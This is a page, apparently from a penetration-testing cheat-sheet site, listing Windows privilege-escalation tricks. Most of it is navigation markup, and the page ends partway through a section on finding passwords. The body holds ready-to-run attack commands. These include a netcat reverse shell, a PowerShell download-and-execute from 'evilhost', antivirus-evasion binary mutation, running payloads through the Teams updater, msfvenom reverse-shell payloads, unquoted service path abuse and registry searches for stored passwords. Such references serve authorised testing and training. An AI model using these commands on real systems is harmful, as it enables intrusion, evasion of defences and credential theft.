    <li data-nav-id="/shells-methods/" class="dd-item haschildren
        ">
      <div>
      <a href="/shells-methods/">Shells methods</a><i class="fa fa-angle-right fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
      </div>
        <ul>
      <li data-nav-id="/shells-methods/methodology/" class="dd-item">
        <div>
          <a href="/shells-methods/methodology/">
            Methodology
          </a><i class="fa fa-circle-thin read-icon"></i>
        </div>
    </li>
      <li data-nav-id="/shells-methods/tty_full/" class="dd-item">
        <div>
          <a href="/shells-methods/tty_full/">
            Fully Interactive TTY Shell
          </a><i class="fa fa-circle-thin read-icon"></i>
        </div>
    </li>
      <li data-nav-id="/shells-methods/webshell/" class="dd-item">
        <div>
          <a href="/shells-methods/webshell/">
            Webshell
          </a><i class="fa fa-circle-thin read-icon"></i>
        </div>
    </li>
      <li data-nav-id="/shells-methods/reverse/" class="dd-item">
        <div>
          <a href="/shells-methods/reverse/">
            Reverse Shell
          </a><i class="fa fa-circle-thin read-icon"></i>
        </div>
    </li>
      <li data-nav-id="/shells-methods/bind/" class="dd-item">
        <div>
          <a href="/shells-methods/bind/">
            Bind Shell
          </a><i class="fa fa-circle-thin read-icon"></i>
        </div>
    </li>
      <li data-nav-id="/shells-methods/windows/" class="dd-item">
        <div>
          <a href="/shells-methods/windows/">
            Windows Shells Methods
          </a><i class="fa fa-circle-thin read-icon"></i>
        </div>
    </li>
        </ul>
    </li>
    <li data-nav-id="/windows-systems/" class="dd-item parent haschildren
        ">
      <div>
      <a href="/windows-systems/">Windows Systems</a>
            <i class="fa fa-angle-down fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
      </div>
        <ul>
    <li data-nav-id="/windows-systems/network-and-domain-recon/" class="dd-item haschildren
        ">
      <div>
      <a href="/windows-systems/network-and-domain-recon/">Network and Domain Recon</a><i class="fa fa-angle-right fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
      </div>
        <ul>
      <li data-nav-id="/windows-systems/network-and-domain-recon/no_credentials_recon/" class="dd-item">
        <div>
          <a href="/windows-systems/network-and-domain-recon/no_credentials_recon/">
            Out of Domain (No credentials)
          </a><i class="fa fa-circle-thin read-icon"></i>
        </div>
    </li>
      <li data-nav-id="/windows-systems/network-and-domain-recon/domain_recon/" class="dd-item">
        <div>
          <a href="/windows-systems/network-and-domain-recon/domain_recon/">
            Domain Recon
          </a><i class="fa fa-circle-thin read-icon"></i>
        </div>
    </li>
      <li data-nav-id="/windows-systems/network-and-domain-recon/domain_mapping/" class="dd-item">
        <div>
          <a href="/windows-systems/network-and-domain-recon/domain_mapping/">
            Domain Mapping
          </a><i class="fa fa-circle-thin read-icon"></i>
        </div>
    </li>
        </ul>
    </li>
    <li data-nav-id="/windows-systems/local-and-physical/" class="dd-item haschildren
        ">
      <div>
      <a href="/windows-systems/local-and-physical/">Local and Physical</a><i class="fa fa-angle-right fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
      </div>
        <ul>
      <li data-nav-id="/windows-systems/local-and-physical/local_recon_enumeration/" class="dd-item">
        <div>
          <a href="/windows-systems/local-and-physical/local_recon_enumeration/">
            Local Recon and Enumeration
          </a><i class="fa fa-circle-thin read-icon"></i>
        </div>
    </li>
      <li data-nav-id="/windows-systems/local-and-physical/physical_access/" class="dd-item">
        <div>
          <a href="/windows-systems/local-and-physical/physical_access/">
            Physical Access
          </a><i class="fa fa-circle-thin read-icon"></i>
        </div>
    </li>
        </ul>
    </li>
    <li data-nav-id="/windows-systems/exploitation/" class="dd-item haschildren
        ">
      <div>
      <a href="/windows-systems/exploitation/">Exploitation</a><i class="fa fa-angle-right fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
      </div>
        <ul>
      <li data-nav-id="/windows-systems/exploitation/exploitation_tricks/" class="dd-item">
        <div>
          <a href="/windows-systems/exploitation/exploitation_tricks/">
            Exploitation Tricks
          </a><i class="fa fa-circle-thin read-icon"></i>
        </div>
    </li>
      <li data-nav-id="/windows-systems/exploitation/remote_execution_techniques/" class="dd-item">
        <div>
          <a href="/windows-systems/exploitation/remote_execution_techniques/">
            Remote Execution Techniques
          </a><i class="fa fa-circle-thin read-icon"></i>
        </div>
    </li>
      <li data-nav-id="/windows-systems/exploitation/crackmapexec/" class="dd-item">
        <div>
          <a href="/windows-systems/exploitation/crackmapexec/">
            CrackMapExec
          </a><i class="fa fa-circle-thin read-icon"></i>
        </div>
    </li>
      <li data-nav-id="/windows-systems/exploitation/impacket/" class="dd-item">
        <div>
          <a href="/windows-systems/exploitation/impacket/">
            Impacket
          </a><i class="fa fa-circle-thin read-icon"></i>
        </div>
    </li>
      <li data-nav-id="/windows-systems/exploitation/kerberos/" class="dd-item">
        <div>
          <a href="/windows-systems/exploitation/kerberos/">
            Kerberos
          </a><i class="fa fa-circle-thin read-icon"></i>
        </div>
    </li>
      <li data-nav-id="/windows-systems/exploitation/rdp_exploitation/" class="dd-item">
        <div>
          <a href="/windows-systems/exploitation/rdp_exploitation/">
            RDP Exploitation
          </a><i class="fa fa-circle-thin read-icon"></i>
        </div>
    </li>
      <li data-nav-id="/windows-systems/exploitation/file_transfer/" class="dd-item">
        <div>
          <a href="/windows-systems/exploitation/file_transfer/">
            File Transfer
          </a><i class="fa fa-circle-thin read-icon"></i>
        </div>
    </li>
      <li data-nav-id="/windows-systems/exploitation/iis/" class="dd-item">
        <div>
          <a href="/windows-systems/exploitation/iis/">
            IIS
          </a><i class="fa fa-circle-thin read-icon"></i>
        </div>
    </li>
      <li data-nav-id="/windows-systems/exploitation/ipv6/" class="dd-item">
        <div>
          <a href="/windows-systems/exploitation/ipv6/">
            IPv6
          </a><i class="fa fa-circle-thin read-icon"></i>
        </div>
    </li>
        </ul>
    </li>
    <li data-nav-id="/windows-systems/privilege-escalation/" class="dd-item parent haschildren
        ">
      <div>
      <a href="/windows-systems/privilege-escalation/">Privilege Escalation</a>
            <i class="fa fa-angle-down fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
      </div>
        <ul>
      <li data-nav-id="/windows-systems/privilege-escalation/admin_processes/" class="dd-item">
        <div>
          <a href="/windows-systems/privilege-escalation/admin_processes/">
            Admin and Processes
          </a><i class="fa fa-circle-thin read-icon"></i>
        </div>
    </li>
      <li data-nav-id="/windows-systems/privilege-escalation/tricks/" class="dd-item active">
        <div>
          <a href="/windows-systems/privilege-escalation/tricks/">
            Tricks
          </a><i class="fa fa-circle-thin read-icon"></i>
        </div>
    </li>
      <li data-nav-id="/windows-systems/privilege-escalation/lsass_mimikatz/" class="dd-item">
        <div>
          <a href="/windows-systems/privilege-escalation/lsass_mimikatz/">
            LSASS and Mimikatz
          </a><i class="fa fa-circle-thin read-icon"></i>
        </div>
    </li>
      <li data-nav-id="/windows-systems/privilege-escalation/windows_defender/" class="dd-item">
        <div>
          <a href="/windows-systems/privilege-escalation/windows_defender/">
            Windows Defender
          </a><i class="fa fa-circle-thin read-icon"></i>
        </div>
    </li>
      <li data-nav-id="/windows-systems/privilege-escalation/privexchange/" class="dd-item">
        <div>
          <a href="/windows-systems/privilege-escalation/privexchange/">
            PrivExchange
          </a><i class="fa fa-circle-thin read-icon"></i>
        </div>
    </li>
      <li data-nav-id="/windows-systems/privilege-escalation/dnsadmins_group/" class="dd-item">
        <div>
          <a href="/windows-systems/privilege-escalation/dnsadmins_group/">
            DNSadmins group
          </a><i class="fa fa-circle-thin read-icon"></i>
        </div>
    </li>
        </ul>
    </li>
    <li data-nav-id="/windows-systems/post-exploitation-techniques/" class="dd-item haschildren
        ">
      <div>
      <a href="/windows-systems/post-exploitation-techniques/">Post Exploitation Techniques</a><i class="fa fa-angle-right fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
      </div>
        <ul>
      <li data-nav-id="/windows-systems/post-exploitation-techniques/ntds_database/" class="dd-item">
        <div>
          <a href="/windows-systems/post-exploitation-techniques/ntds_database/">
            NTDS Database
          </a><i class="fa fa-circle-thin read-icon"></i>
        </div>
    </li>
      <li data-nav-id="/windows-systems/post-exploitation-techniques/silver_golden_tickets/" class="dd-item">
        <div>
          <a href="/windows-systems/post-exploitation-techniques/silver_golden_tickets/">
            Silver and Golden Tickets
          </a><i class="fa fa-circle-thin read-icon"></i>
        </div>
    </li>
      <li data-nav-id="/windows-systems/post-exploitation-techniques/dc_shadow/" class="dd-item">
        <div>
          <a href="/windows-systems/post-exploitation-techniques/dc_shadow/">
            DC Shadow
          </a><i class="fa fa-circle-thin read-icon"></i>
        </div>
    </li>
      <li data-nav-id="/windows-systems/post-exploitation-techniques/searching_informations/" class="dd-item">
        <div>
          <a href="/windows-systems/post-exploitation-techniques/searching_informations/">
            Searching Informations
          </a><i class="fa fa-circle-thin read-icon"></i>
        </div>
    </li>
      <li data-nav-id="/windows-systems/post-exploitation-techniques/persistence/" class="dd-item">
        <div>
          <a href="/windows-systems/post-exploitation-techniques/persistence/">
            Persistence
          </a><i class="fa fa-circle-thin read-icon"></i>
        </div>
    </li>
        </ul>
    </li>
        </ul>
    </li>
    <li data-nav-id="/linux-systems/" class="dd-item haschildren
        ">
      <div>
      <a href="/linux-systems/">Linux Systems</a><i class="fa fa-angle-right fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
      </div>
        <ul>
      <li data-nav-id="/linux-systems/recon_enumeration/" class="dd-item">
        <div>
          <a href="/linux-systems/recon_enumeration/">
            Recon and Enumeration
          </a><i class="fa fa-circle-thin read-icon"></i>
        </div>
    </li>
      <li data-nav-id="/linux-systems/file_transfer/" class="dd-item">
        <div>
          <a href="/linux-systems/file_transfer/">
            File Transfer
          </a><i class="fa fa-circle-thin read-icon"></i>
        </div>
    </li>
    <li data-nav-id="/linux-systems/privilege-escalation/" class="dd-item haschildren
        ">
      <div>
      <a href="/linux-systems/privilege-escalation/">Privilege Escalation</a><i class="fa fa-angle-right fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
      </div>
        <ul>
      <li data-nav-id="/linux-systems/privilege-escalation/system_tricks/" class="dd-item">
        <div>
          <a href="/linux-systems/privilege-escalation/system_tricks/">
            System Tricks
          </a><i class="fa fa-circle-thin read-icon"></i>
        </div>
    </li>
      <li data-nav-id="/linux-systems/privilege-escalation/abusing_sudo_rights/" class="dd-item">
        <div>
          <a href="/linux-systems/privilege-escalation/abusing_sudo_rights/">
            Abusing Sudo Rights
          </a><i class="fa fa-circle-thin read-icon"></i>
        </div>
    </li>
      <li data-nav-id="/linux-systems/privilege-escalation/suid/" class="dd-item">
        <div>
          <a href="/linux-systems/privilege-escalation/suid/">
            SUID Files
          </a><i class="fa fa-circle-thin read-icon"></i>
        </div>
    </li>
      <li data-nav-id="/linux-systems/privilege-escalation/services/" class="dd-item">
        <div>
          <a href="/linux-systems/privilege-escalation/services/">
            Services
          </a><i class="fa fa-circle-thin read-icon"></i>
        </div>
    </li>
      <li data-nav-id="/linux-systems/privilege-escalation/crontab/" class="dd-item">
        <div>
          <a href="/linux-systems/privilege-escalation/crontab/">
            Crontab
          </a><i class="fa fa-circle-thin read-icon"></i>
        </div>
    </li>
        </ul>
    </li>
    <li data-nav-id="/linux-systems/programing-languages/" class="dd-item haschildren
        ">
      <div>
      <a href="/linux-systems/programing-languages/">Programing Languages</a><i class="fa fa-angle-right fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
      </div>
        <ul>
      <li data-nav-id="/linux-systems/programing-languages/bash/" class="dd-item">
        <div>
          <a href="/linux-systems/programing-languages/bash/">
            Bash
          </a><i class="fa fa-circle-thin read-icon"></i>
        </div>
    </li>
      <li data-nav-id="/linux-systems/programing-languages/python/" class="dd-item">
        <div>
          <a href="/linux-systems/programing-languages/python/">
            Python
          </a><i class="fa fa-circle-thin read-icon"></i>
        </div>
    </li>
      <li data-nav-id="/linux-systems/programing-languages/perl/" class="dd-item">
        <div>
          <a href="/linux-systems/programing-languages/perl/">
            Perl
          </a><i class="fa fa-circle-thin read-icon"></i>
        </div>
    </li>
        </ul>
    </li>
        </ul>
    </li>
    <li data-nav-id="/other-systems/" class="dd-item haschildren
        ">
      <div>
      <a href="/other-systems/">Other Systems</a><i class="fa fa-angle-right fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
      </div>
        <ul>
      <li data-nav-id="/other-systems/ipbx/" class="dd-item">
        <div>
          <a href="/other-systems/ipbx/">
            IPBX
          </a><i class="fa fa-circle-thin read-icon"></i>
        </div>
    </li>
      <li data-nav-id="/other-systems/freeipa/" class="dd-item">
        <div>
          <a href="/other-systems/freeipa/">
            FREEIPA
          </a><i class="fa fa-circle-thin read-icon"></i>
        </div>
    </li>
      <li data-nav-id="/other-systems/misc/" class="dd-item">
        <div>
          <a href="/other-systems/misc/">
            MISC
          </a><i class="fa fa-circle-thin read-icon"></i>
        </div>
    </li>
      <li data-nav-id="/other-systems/docker_stuff/" class="dd-item">
        <div>
          <a href="/other-systems/docker_stuff/">
            Docker Stuff
          </a><i class="fa fa-circle-thin read-icon"></i>
        </div>
    </li>
        </ul>
    </li>
    <li data-nav-id="/passcracking-hashfiles/" class="dd-item haschildren
        ">
      <div>
      <a href="/passcracking-hashfiles/">Passcracking Hash &amp; Files</a><i class="fa fa-angle-right fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
      </div>
        <ul>
      <li data-nav-id="/passcracking-hashfiles/hashcat_cheatsheet/" class="dd-item">
        <div>
          <a href="/passcracking-hashfiles/hashcat_cheatsheet/">
            Hashcat Cheatsheet
          </a><i class="fa fa-circle-thin read-icon"></i>
        </div>
    </li>
      <li data-nav-id="/passcracking-hashfiles/john_cheatsheet/" class="dd-item">
        <div>
          <a href="/passcracking-hashfiles/john_cheatsheet/">
            John Cheatsheet
          </a><i class="fa fa-circle-thin read-icon"></i>
        </div>
    </li>
      <li data-nav-id="/passcracking-hashfiles/cracking_files/" class="dd-item">
        <div>
          <a href="/passcracking-hashfiles/cracking_files/">
            Cracking files
          </a><i class="fa fa-circle-thin read-icon"></i>
        </div>
    </li>
      <li data-nav-id="/passcracking-hashfiles/wordlists/" class="dd-item">
        <div>
          <a href="/passcracking-hashfiles/wordlists/">
            Wordlists &amp; Co
          </a><i class="fa fa-circle-thin read-icon"></i>
        </div>
    </li>
        </ul>
    </li>
    <li data-nav-id="/cryptography/" class="dd-item haschildren
        ">
      <div>
      <a href="/cryptography/">Cryptography</a><i class="fa fa-angle-right fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
      </div>
        <ul>
      <li data-nav-id="/cryptography/rsa/" class="dd-item">
        <div>
          <a href="/cryptography/rsa/">
            RSA Encryption
          </a><i class="fa fa-circle-thin read-icon"></i>
        </div>
    </li>
      <li data-nav-id="/cryptography/aes/" class="dd-item">
        <div>
          <a href="/cryptography/aes/">
            AES Encryption
          </a><i class="fa fa-circle-thin read-icon"></i>
        </div>
    </li>
      <li data-nav-id="/cryptography/misc/" class="dd-item">
        <div>
          <a href="/cryptography/misc/">
            MISC
          </a><i class="fa fa-circle-thin read-icon"></i>
        </div>
    </li>
        </ul>
    </li>
    <li data-nav-id="/pwn/" class="dd-item haschildren
        ">
      <div>
      <a href="/pwn/">Pwn</a><i class="fa fa-angle-right fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
      </div>
        <ul>
    <li data-nav-id="/pwn/buffer-overflow/" class="dd-item haschildren
        ">
      <div>
      <a href="/pwn/buffer-overflow/">Buffer Overflow (BoF)</a><i class="fa fa-angle-right fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
      </div>
        <ul>
      <li data-nav-id="/pwn/buffer-overflow/easy_no_protection/" class="dd-item">
        <div>
          <a href="/pwn/buffer-overflow/easy_no_protection/">
            Easy - No Protections
          </a><i class="fa fa-circle-thin read-icon"></i>
        </div>
    </li>
        </ul>
    </li>
      <li data-nav-id="/pwn/general_infos/" class="dd-item">
        <div>
          <a href="/pwn/general_infos/">
            General Informations
          </a><i class="fa fa-circle-thin read-icon"></i>
        </div>
    </li>
        </ul>
    </li>
    <li data-nav-id="/wireless/" class="dd-item haschildren
        ">
      <div>
      <a href="/wireless/">Wireless</a><i class="fa fa-angle-right fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
      </div>
        <ul>
      <li data-nav-id="/wireless/wifi_cracking/" class="dd-item">
        <div>
          <a href="/wireless/wifi_cracking/">
            WiFi Cracking
          </a><i class="fa fa-circle-thin read-icon"></i>
        </div>
    </li>
      <li data-nav-id="/wireless/rogue_ap/" class="dd-item">
        <div>
          <a href="/wireless/rogue_ap/">
            Rogue AP Attack
          </a><i class="fa fa-circle-thin read-icon"></i>
        </div>
    </li>
        </ul>
    </li>
    <li data-nav-id="/phishing-redteam-and-se/" class="dd-item haschildren
        ">
      <div>
      <a href="/phishing-redteam-and-se/">Phishing, RedTeam and SE</a><i class="fa fa-angle-right fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
      </div>
        <ul>
      <li data-nav-id="/phishing-redteam-and-se/phishing_campaign_setup/" class="dd-item">
        <div>
          <a href="/phishing-redteam-and-se/phishing_campaign_setup/">
            Phishing Infrastructure (Gophish&#43;Vultr)
          </a><i class="fa fa-circle-thin read-icon"></i>
        </div>
    </li>
        </ul>
    </li>




    </ul>
    <section>
    </section>
  </aside>
  <section class="page">
    
    <div class="nav-select">
      <center>Navigation : 
        <select onchange="javascript:location.href = this.value;">
          
    <option value="/open-source-intelligence-osint/" >
   Open Source Intelligence (OSINT)</option>
    <option value="/recon-enumeration/" >
   Recon - Enumeration</option>
    <option value="/web-attacks/" >
   Web vulnerabilities &amp; attacks</option>
    <option value="/network/" >
   Network</option>
    <option value="/shells-methods/" >
   Shells methods</option>
    <option value="/windows-systems/" >
   Windows Systems</option> 
    <option value="/windows-systems/network-and-domain-recon/" >
  - 
   Network and Domain Recon</option>
    <option value="/windows-systems/local-and-physical/" >
  - 
   Local and Physical</option>
    <option value="/windows-systems/exploitation/" >
  - 
   Exploitation</option>
    <option value="/windows-systems/privilege-escalation/" >
  - 
   Privilege Escalation</option> 
      <option value="/windows-systems/privilege-escalation/admin_processes/" >-- Admin and Processes</option>
      <option value="/windows-systems/privilege-escalation/tricks/"  selected>-- Tricks</option>
      <option value="/windows-systems/privilege-escalation/lsass_mimikatz/" >-- LSASS and Mimikatz</option>
      <option value="/windows-systems/privilege-escalation/windows_defender/" >-- Windows Defender</option>
      <option value="/windows-systems/privilege-escalation/privexchange/" >-- PrivExchange</option>
      <option value="/windows-systems/privilege-escalation/dnsadmins_group/" >-- DNSadmins group</option>
  
    <option value="/windows-systems/post-exploitation-techniques/" >
  - 
   Post Exploitation Techniques</option>
  
    <option value="/linux-systems/" >
   Linux Systems</option>
    <option value="/other-systems/" >
   Other Systems</option>
    <option value="/passcracking-hashfiles/" >
   Passcracking Hash &amp; Files</option>
    <option value="/cryptography/" >
   Cryptography</option>
    <option value="/pwn/" >
   Pwn</option>
    <option value="/wireless/" >
   Wireless</option>
    <option value="/phishing-redteam-and-se/" >
   Phishing, RedTeam and SE</option>



        </select>
      </center>
    </div>
      <div>
        <div class="searchbox">
          <input data-search-input id="search-by" type="text" placeholder="Search...">
        </div>
        <script type="text/javascript" src="/js/lunr.min.js"></script>
        <script type="text/javascript" src="/js/auto-complete.js"></script>
        <link href="/css/auto-complete.css" rel="stylesheet">
        <script type="text/javascript">
          
              var baseurl = "\/";
          
        </script>
        <script type="text/javascript" src="/js/search.js"></script>
      </div>
    

    <h1>Tricks</h1>
    
    
    
    

<h3 id="global-tricks">Global Tricks</h3>
<div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">https://enigma0x3.net/2015/01/21/phishing-for-credentials-if-you-want-it-just-ask/
https://guif.re/windowseop
https://hackingandsecurity.blogspot.com/2017/09/oscp-windows-priviledge-escalation.html

https://lolbas-project.github.io/#
python3 gtfo -e Certutil.exe

<span style="color:#75715e"># You can feed syteminfo output to windows-exploit-suggester</span>
./windows-exploit-suggester.py --update
./windows-exploit-suggester.py --database <span style="color:#ae81ff">2019</span>-02-19-mssb.xls --systeminfo /home/xxx/Documents/Galactic/systeminfo.txt

<span style="color:#75715e"># Metasploit also has a module</span>
 &gt; use post/multi/recon/local_exploit_suggester
msf5 post<span style="color:#f92672">(</span>multi/recon/local_exploit_suggester<span style="color:#f92672">)</span> &gt; options

Module options <span style="color:#f92672">(</span>post/multi/recon/local_exploit_suggester<span style="color:#f92672">)</span>:

   Name             Current Setting  Required  Description
   ----             ---------------  --------  -----------
   SESSION                           yes       The session to run this module on
   SHOWDESCRIPTION  <span style="color:#111">false</span>            yes       Displays a detailed description <span style="color:#00a8c8">for</span> the available exploits

msf5 post<span style="color:#f92672">(</span>multi/recon/local_exploit_suggester<span style="color:#f92672">)</span> &gt; <span style="color:#111">set</span> SESSION <span style="color:#ae81ff">1</span>
<span style="color:#111">SESSION</span> <span style="color:#f92672">=</span>&gt; <span style="color:#ae81ff">1</span>
msf5 post<span style="color:#f92672">(</span>multi/recon/local_exploit_suggester<span style="color:#f92672">)</span> &gt; run

<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> <span style="color:#ae81ff">10</span>.10.10.14 - Collecting <span style="color:#111">local</span> exploits <span style="color:#00a8c8">for</span> x86/windows...
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> <span style="color:#ae81ff">10</span>.10.10.14 - <span style="color:#ae81ff">29</span> exploit checks are being tried...
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> <span style="color:#ae81ff">10</span>.10.10.14 - exploit/windows/local/ms10_015_kitrap0d: The target service is running, but could not be validated.
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> <span style="color:#ae81ff">10</span>.10.10.14 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> <span style="color:#ae81ff">10</span>.10.10.14 - exploit/windows/local/ms14_070_tcpip_ioctl: The target appears to be vulnerable.
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> <span style="color:#ae81ff">10</span>.10.10.14 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> <span style="color:#ae81ff">10</span>.10.10.14 - exploit/windows/local/ms16_016_webdav: The target service is running, but could not be validated.
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> <span style="color:#ae81ff">10</span>.10.10.14 - exploit/windows/local/ms16_032_secondary_logon_handle_privesc: The target service is running, but could not be validated.
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> <span style="color:#ae81ff">10</span>.10.10.14 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Post module execution completed

<span style="color:#75715e"># Getting shell in limited interpreter</span>
system<span style="color:#f92672">(</span><span style="color:#d88200">&#34;start cmd.exe /k </span><span style="color:#111">$cmd</span><span style="color:#d88200">&#34;</span><span style="color:#f92672">)</span>

<span style="color:#75715e"># Reverse shell</span>
nc.exe attacker_ip attacker_port -e cmd.exe

<span style="color:#75715e"># From admin to SYSTEM</span>
psexec.exe -i -s %SystemRoot%<span style="color:#8045ff">\s</span>ystem32<span style="color:#8045ff">\c</span>md.exe

<span style="color:#75715e"># AV Bypass</span>
<span style="color:#75715e"># You can generate mutated binary</span>
hyperion.exe ../backdoor.exe ../backdoor_mutation.exe

<span style="color:#75715e"># Download and exec powershell on target</span>
powershell.exe <span style="color:#d88200">&#34;IEX (New-Object  Net.WebClient).DownloadString(&#39;http://evilhost/Malicious.ps1&#39;)&#34;</span>

<span style="color:#75715e"># Payload as a trusted binary</span>
<span style="color:#75715e"># Copy your payload into</span> 
%userprofile%<span style="color:#8045ff">\A</span>ppData<span style="color:#8045ff">\L</span>ocal<span style="color:#8045ff">\M</span>icrosoft<span style="color:#8045ff">\T</span>eams<span style="color:#8045ff">\c</span>urrent<span style="color:#8045ff">\
</span><span style="color:#8045ff"></span><span style="color:#75715e"># Then</span>
%userprofile%<span style="color:#8045ff">\A</span>ppData<span style="color:#8045ff">\L</span>ocal<span style="color:#8045ff">\M</span>icrosoft<span style="color:#8045ff">\T</span>eams<span style="color:#8045ff">\U</span>pdate.exe --processStart payload.exe --process-start-args <span style="color:#d88200">&#34;whatever args&#34;</span></code></pre></div>
<p><br/></p>

<h3 id="process-migration">Process Migration</h3>
<div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># Migration can be essential to get persistence</span>
<span style="color:#75715e"># You might need to migrate into a classic process</span>
msf&gt; ps aux 
msf&gt; migrate &lt;pid&gt;

<span style="color:#75715e"># Automigrate is also sometimes needed if the shell is dying quickly</span>
$ cat automigrate.rc
run post/windows/manage/migrate

msf5 &gt; use exploit/multi/handler
msf5 exploit<span style="color:#f92672">(</span>multi/handler<span style="color:#f92672">)</span> &gt; <span style="color:#111">set</span> PAYLOAD windows/meterpreter/reverse_tcp
msf5 exploit<span style="color:#f92672">(</span>multi/handler<span style="color:#f92672">)</span> &gt; <span style="color:#111">set</span> LHOST xx.xx.xx.xx
msf5 exploit<span style="color:#f92672">(</span>multi/handler<span style="color:#f92672">)</span> &gt; <span style="color:#111">set</span> LPORT <span style="color:#ae81ff">5566</span>
msf5 exploit<span style="color:#f92672">(</span>multi/handler<span style="color:#f92672">)</span> &gt; <span style="color:#111">set</span> AutoRunScript multi_console_command -r /path/to/automigrate.rc
msf5 exploit<span style="color:#f92672">(</span>multi/handler<span style="color:#f92672">)</span> &gt; exploit</code></pre></div>
<p><br/></p>

<h3 id="folder-and-files-rights">Folder and Files Rights</h3>
<div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># icacls allows you to check for files and folder permissions</span>
C:&gt; icacls Desktop/
C:&gt; icacls root.txt

<span style="color:#75715e"># If you have rights on the folder but not especially on files, you can grant them</span>
C:&gt; icacls root.txt /grant user:F</code></pre></div>
<p><br/></p>

<h3 id="unquoted-paths">Unquoted Paths</h3>
<div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># Some paths are vulnerable</span>
<span style="color:#75715e"># It occurs because Windows will try for every whitespace, to find the binary in every intermediate folder</span>
C:<span style="color:#8045ff">\P</span>rogram Files<span style="color:#8045ff">\s</span>omething<span style="color:#8045ff">\w</span>inamp.exe

<span style="color:#75715e"># You could place your payload in</span>
C:<span style="color:#8045ff">\P</span>rogram.exe
C:<span style="color:#8045ff">\P</span>rogram Files.exe

<span style="color:#75715e"># The following command will display affected services</span>
wmic service get name,displayname,pathname,startmode <span style="color:#111">|</span>findstr /i <span style="color:#d88200">&#34;Auto&#34;</span> <span style="color:#111">|</span>findstr /i /v <span style="color:#d88200">&#34;C:\Windows\\&#34;</span> <span style="color:#111">|</span>findstr /i /v <span style="color:#d88200">&#34;&#34;&#34; rmthelastquote&#34;</span>

<span style="color:#75715e"># Reverse shell</span>
msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai <span style="color:#111">LHOST</span><span style="color:#f92672">=</span><span style="color:#ae81ff">192</span>.168.2.60 <span style="color:#111">LPORT</span><span style="color:#f92672">=</span><span style="color:#ae81ff">8989</span> -f exe -o A.exe
msf&gt; upload -f A.exe
sc stop <span style="color:#d88200">&#34;Vulnerable Service&#34;</span>

<span style="color:#75715e"># If can&#39;t, you can reboot</span>
shutdown /r /t <span style="color:#ae81ff">0</span>

<span style="color:#75715e"># Session will die quickly, so it is necessary to automigrate</span>
<span style="color:#75715e"># when a service starts in Windows operating systems, it must communicate with the Service Control Manager.</span>
<span style="color:#75715e"># If it’s not, Service Control Manager thinks that something is not going well and terminates the process</span>

<span style="color:#75715e"># MSF Module for this vulnerability</span>
exploit/windows/local/trusted_service_path</code></pre></div>
<p><br/></p>

<h3 id="clear-text-passwords">Clear text passwords</h3>
<div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># You can find passwords in arbitrary files</span>
findstr /si password *.txt
findstr /si password *.xml
findstr /si password *.ini

<span style="color:#75715e"># Find all passwords in all files</span>
findstr /spin <span style="color:#d88200">&#34;password&#34;</span> *.*

<span style="color:#75715e"># Some common files to find them in</span>
dir c:*vnc.ini /s /b
dir c:*ultravnc.ini /s /b
dir c:<span style="color:#8045ff">\ </span>/s /b <span style="color:#111">|</span> findstr /si *vnc.ini

<span style="color:#75715e"># Stuff in the registry</span>
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
reg query <span style="color:#d88200">&#34;HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon&#34;</span>
reg query <span style="color:#d88200">&#34;HKLM\SYSTEM\Current\ControlSet\Services\SNMP&#34;</span>
reg query <span style="color:#d88200">&#34;HKCU\Software\SimonTatham\PuTTY\Sessions&#34;</span>
reg query HKEY_LOCAL_MACHINE<span style="color:#8045ff">\S</span>OFTWARE<span style="color:#8045ff">\R</span>ealVNC<span style="color:#8045ff">\W</span>inVNC4 /v password

<span style="color:#75715e"># Search for passwords in the registry</span>
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s

<span style="color:#75715e"># searhc for files containing keywoards</span>
